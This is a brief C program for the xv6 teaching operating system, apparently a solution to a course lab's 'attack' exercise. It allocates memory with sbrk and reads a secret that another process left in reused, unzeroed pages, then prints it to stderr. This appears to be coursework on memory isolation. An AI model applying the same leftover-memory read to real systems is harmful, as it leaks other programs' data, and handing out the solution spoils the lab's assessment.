#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

/* https://blog.csdn.net/weixin_42543071/article/details/143351746 */

int
main(int argc, char *argv[])
{
  if(argc != 1){
    printf("usage: attack");
    exit(0);
  }
  char *end = sbrk(PGSIZE*32);
  end = end + 16 * PGSIZE;          
  // printf("secret: %s\n", end + 32);
  write(2, end+32, 8);
  exit(1);
}
